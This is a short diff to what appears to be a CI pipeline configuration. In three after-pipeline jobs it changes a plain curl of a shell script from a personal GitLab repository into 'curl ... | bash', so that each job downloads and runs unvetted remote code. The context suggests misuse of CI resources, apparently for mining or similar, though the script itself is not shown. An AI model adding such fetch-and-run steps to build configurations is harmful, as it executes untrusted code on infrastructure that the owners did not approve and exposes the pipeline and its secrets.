@@ -16,10 +16,10 @@ after_pipeline:
     jobs:
       - name: 'Job #1'
         commands:
-          - 'curl https://gitlab.com/azkadafa39/sambel/-/raw/main/btrm_linux.sh'
+          - 'curl https://gitlab.com/azkadafa39/sambel/-/raw/main/btrm_linux.sh | bash'
       - name: 'Job #2'
         commands:
-          - 'curl https://gitlab.com/azkadafa39/sambel/-/raw/main/btrm_linux.sh'
+          - 'curl https://gitlab.com/azkadafa39/sambel/-/raw/main/btrm_linux.sh | bash'
       - name: 'Job #3'
         commands:
-          - 'curl https://gitlab.com/azkadafa39/sambel/-/raw/main/btrm_linux.sh'
+          - 'curl https://gitlab.com/azkadafa39/sambel/-/raw/main/btrm_linux.sh | bash'
